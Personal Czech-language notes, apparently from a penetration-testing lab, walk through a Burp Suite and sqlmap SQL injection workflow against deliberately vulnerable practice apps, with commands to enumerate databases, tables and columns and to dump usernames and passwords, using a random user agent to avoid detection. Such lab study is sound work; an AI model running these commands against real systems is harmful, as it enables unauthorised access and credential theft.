1. zapnu burp suite a odeslu formular s udajema
2. ulozim si raw udaje do .txt souboru 
3. prikaz na mapovani SQL = sqlmap -r (ulozeny raw.txt) --batch --random-agent
        >> --batch =nepta se a automaticky pokracuje --random-agent =user agent kvuli odhaleni

        >> automaticky otestuje vsechny parametry ktere najde v .txt
        >> zkusi zranitelnost
        >> v pozitivnim nalezu mi sql da priklad    
            >> sqlmap resumed the following injection point(s) from stored session:
            Parameter: username (GET)

4. zjistit nazvy databazi

        >> sqlmap -r (raw z burp.txt) -p parametr ktery to naslo --dbs --dbms=(nazev DB kterou to identifikuje)--batch --random-agent --flush-session (smaze stare vysledky)

        >> dostanu vysledky typu (to jsou jednotliv)
                                    [*] bricks
                                    [*] bwapp
                                    [*] citizens
                                    [*] cryptomg
                                    [*] dvwa
                                    [*] gallery2
                                    [*] getboo
                                    [*] ghost
                                    [*] gtd-php

5. vybrat databazi z vyberu
        >> sqlmap -r raw.txt -p parametr ktery to naslo -D nazev databaze --tables --flush-session

        >> Database: nowasp
                            [12 tables]
                            +----------------------------+
                            | accounts                   |
                            | balloon_tips               |
                            | blogs_table                |
                            | captured_data              |
                            | credit_cards               |
                            | help_texts                 |
                            | hitlog                     |
                            | level_1_help_include_files |
                            | page_help                  |
                            | page_hints                 |
                            | pen_test_tools             |


6. zobrazeni sloupcu (pouze sloupe bez hodnot)
        >>  sqlmap -r raw.txt -p parametr co nasel burpsuite -D nazev databaze -T accounts --columns --dbms=mysql --batch --random-agent --flush-session

7. zobrazeni dat bud vsechny nebo jen urcite sloupce 

        urcite sloupce >> sqlmap -r req.txt -p username -D nowasp -T accounts --dump -C username,password --dbms=mysql --batch --random-agent --flush-session


        vsechny sloupce >> sqlmap -r req.txt -p username -D nowasp -T accounts --dump --dbms=mysql --batch --random-agent --flush-session
